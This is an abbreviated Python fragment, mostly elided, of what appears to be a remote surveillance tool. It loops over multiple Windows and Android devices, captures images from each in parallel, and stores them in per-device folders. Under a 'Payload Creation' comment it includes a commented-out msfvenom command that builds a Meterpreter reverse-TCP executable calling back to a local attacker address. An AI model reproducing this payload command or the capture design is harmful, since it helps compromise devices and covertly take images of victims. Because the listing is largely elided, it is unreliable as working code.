...
def image_capture_windows(inp):
	...
	if(m==1):
		...
		directory = "images/Windows Device " + str(inp)
...
def capture_windows():
	...
	# Payload Creation
	#os.system('msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=333 -f exe > shell.exe')
		...
		while(count<100):
			...
			try:
				...
				with concurrent.futures.ProcessPoolExecutor() as executor:
					executor.map(image_capture_windows, ids)
...
def image_capture_android(inp):
	...
	if(m==1):
		# Directory for a particular device
		directory = "images/Android Device " + str(inp)
	...
	while(op=="yes"):
		...
		while(count<100):
			...
			try:
				...
				# Initiating Multiprocessing
				with concurrent.futures.ProcessPoolExecutor() as executor:
					executor.map(image_capture_android, ids)
